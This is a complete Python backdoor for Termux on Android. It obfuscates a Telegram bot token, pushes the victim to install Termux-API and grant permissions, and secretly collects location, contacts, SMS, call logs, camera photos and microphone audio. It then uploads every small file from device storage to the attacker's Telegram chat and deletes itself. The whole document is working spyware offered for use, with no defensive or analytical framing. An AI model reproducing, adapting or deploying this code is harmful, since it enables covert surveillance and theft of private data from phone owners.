import os
import sys
import subprocess
import time
import requests
import json
import base64
import glob


ENCODED_HEX = "5a324a6e5a3268685932426961576c776348513056474e695a5464464f6b6b3449586f374e6a4e45596b6b7063696c79496a683952576336524835385a6955685269513d"

def decode_token(hex_str):
    # Hex -> bytes
    hex_bytes = bytes.fromhex(hex_str)
    b64_str = hex_bytes.decode('ascii')
    # Base64 -> bytes
    try:
        b64_decoded = base64.b64decode(b64_str)
        rot47_encoded = b64_decoded.decode('ascii')
    except:
        rot47_encoded = b64_str
    # ROT47 decode
    def rot47(s):
        result = []
        for ch in s:
            o = ord(ch)
            if 33 <= o <= 126:
                o = 33 + ((o - 33 + 47) % 94)
            result.append(chr(o))
        return ''.join(result)
    return rot47(rot47_encoded)

TOKEN_DATA = decode_token(ENCODED_HEX)
try:
    BOT_TOKEN, CHAT_ID = TOKEN_DATA.split(':')
except:
    BOT_TOKEN = TOKEN_DATA
    CHAT_ID = None

def send_telegram(text, file_path=None):
    if not BOT_TOKEN or not CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=5)
    except:
        pass
    if file_path and os.path.exists(file_path):
        files = {"document": open(file_path, "rb")}
        url_file = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        try:
            requests.post(url_file, data={"chat_id": CHAT_ID}, files=files, timeout=10)
        except:
            pass

# ========== SETUP ==========
def install_deps():
    packages = ["python", "python-pip", "git", "curl", "wget", "jq"]
    for pkg in packages:
        subprocess.run(["pkg", "install", "-y", pkg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["pip", "install", "requests"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def request_storage():
    if not os.path.exists("/sdcard"):
        subprocess.run(["termux-setup-storage"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)
    return os.path.exists("/sdcard")

def install_termux_api():
    try:
        subprocess.run(["termux-battery-status"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except:
        pass
    apk_url = "https://github.com/termux/termux-api/releases/download/v0.53.0/termux-api-app_v0.53.0+github.debug.apk"
    apk_path = "/sdcard/termux-api.apk"
    try:
        r = requests.get(apk_url, stream=True)
        with open(apk_path, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
        send_telegram("Please install Termux-API APK from /sdcard/ and grant all permissions.")
        subprocess.run(["termux-open", apk_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(10)
        return True
    except:
        return False

def grant_permissions():
    cmds = [
        ["termux-battery-status"],
        ["termux-camera-photo", "/sdcard/test.jpg"],
        ["termux-location"],
        ["termux-contact-list"],
        ["termux-sms-inbox"],
        ["termux-call-log"],
        ["termux-microphone-record", "-d", "2"]
    ]
    for cmd in cmds:
        try:
            subprocess.run(cmd, timeout=2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
        time.sleep(1)

# ========== DATA COLLECTION ==========
def get_ip_info():
    try:
        r = requests.get("https://api.ipify.org?format=json", timeout=5)
        ip = r.json().get('ip')
        r2 = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        geo = r2.json()
        return f"IP: {ip}\n" + json.dumps(geo, indent=2)
    except:
        return "IP info failed"

def gather_api_data():
    data = {}
    try:
        out = subprocess.check_output(["termux-battery-status"], text=True)
        data['battery'] = json.loads(out)
    except: pass
    try:
        out = subprocess.check_output(["termux-location"], text=True)
        data['location'] = json.loads(out)
    except: pass
    try:
        out = subprocess.check_output(["termux-contact-list"], text=True)
        data['contacts'] = json.loads(out)
    except: pass
    try:
        out = subprocess.check_output(["termux-sms-inbox"], text=True)
        data['sms'] = json.loads(out)
    except: pass
    try:
        out = subprocess.check_output(["termux-call-log"], text=True)
        data['call_log'] = json.loads(out)
    except: pass
    try:
        subprocess.run(["termux-camera-photo", "/sdcard/cam_shot.jpg"], timeout=3)
        data['camera_photo'] = "/sdcard/cam_shot.jpg"
    except: pass
    try:
        subprocess.run(["termux-microphone-record", "-d", "3", "-f", "/sdcard/audio.amr"], timeout=5)
        data['audio'] = "/sdcard/audio.amr"
    except: pass
    return data

def walk_files():
    dirs = ["/sdcard", "/storage/emulated/0", "/data/data/com.termux/files/home"]
    for root_dir in dirs:
        if os.path.exists(root_dir):
            for root, _, files in os.walk(root_dir):
                for f in files:
                    path = os.path.join(root, f)
                    try:
                        if os.path.getsize(path) > 5*1024*1024:
                            continue
                        send_telegram(f"File: {path}", file_path=path)
                        time.sleep(0.5)
                    except:
                        pass

# ========== MAIN ==========
def main():
    send_telegram("[+] Backdoor started.")
    install_deps()
    if request_storage():
        send_telegram("[+] Storage granted.")
    else:
        send_telegram("[!] Storage denied.")
    install_termux_api()
    grant_permissions()
    send_telegram("[IP Info]\n" + get_ip_info())
    api_data = gather_api_data()
    for key, val in api_data.items():
        if isinstance(val, str) and os.path.exists(val):
            send_telegram(f"API {key}", file_path=val)
        else:
            send_telegram(f"API {key}\n{json.dumps(val, indent=2)}")
    send_telegram("[+] File exfiltration...")
    walk_files()
    send_telegram("[+] Exfiltration complete.")
    # Self-delete
    try:
        os.remove(__file__)
    except:
        pass
    sys.exit(0)

if __name__ == "__main__":
    main()
